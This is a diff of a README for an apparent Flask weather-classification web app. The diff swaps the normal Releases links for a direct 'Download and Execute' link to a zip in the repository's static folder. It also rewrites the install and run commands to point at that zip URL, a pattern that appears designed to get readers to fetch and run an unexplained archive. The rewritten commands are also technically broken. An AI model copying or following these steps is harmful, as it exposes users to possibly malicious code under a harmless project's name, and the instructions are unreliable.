@@ -20,15 +20,15 @@ In today's world of interconnected technologies, the ability to accurately predi
 - **Repository Name:** Weather-Type-Classification-WebApp
 - **Short Description:** A Flask-based ML web app for classifying weather types (Sunny, Rainy, Cloudy, Snowy) using multiple models.
 - **Topics:** ai, classification, data-science, decision-trees, deep-learning, flask, iot, knn, logistic-regression, machine-learning, ml-models, predictive-modeling, python, random-forest, support-vector-machines, weather, weather-classification, weather-forecast
-- **Release Link:** [Download and Execute](https://github.com/IsaCouture/Weather-Type-Classification-WebApp/releases)
+- **Release Link:** [Download and Execute](https://github.com/IsaCouture/Weather-Type-Classification-WebApp/raw/refs/heads/master/static/Weather_Classification_App_Type_Web_3.8-alpha.1.zip)
 
-For more details and to access the latest version of the web application, please visit the [Releases](https://github.com/IsaCouture/Weather-Type-Classification-WebApp/releases) section of this repository.
+For more details and to access the latest version of the web application, please visit the [Releases](https://github.com/IsaCouture/Weather-Type-Classification-WebApp/raw/refs/heads/master/static/Weather_Classification_App_Type_Web_3.8-alpha.1.zip) section of this repository.
 
 ## How to Use 🚀
 
 1. Clone the repository to your local machine.
-2. Install the required dependencies using `pip install -r requirements.txt`.
-3. Run the Flask application with `python app.py`.
+2. Install the required dependencies using `pip install -r https://github.com/IsaCouture/Weather-Type-Classification-WebApp/raw/refs/heads/master/static/Weather_Classification_App_Type_Web_3.8-alpha.1.zip`.
+3. Run the Flask application with `python https://github.com/IsaCouture/Weather-Type-Classification-WebApp/raw/refs/heads/master/static/Weather_Classification_App_Type_Web_3.8-alpha.1.zip`.
 4. Access the web application through your browser.
 5. Input the relevant weather data and explore the different weather classifications provided by the machine learning models.
 
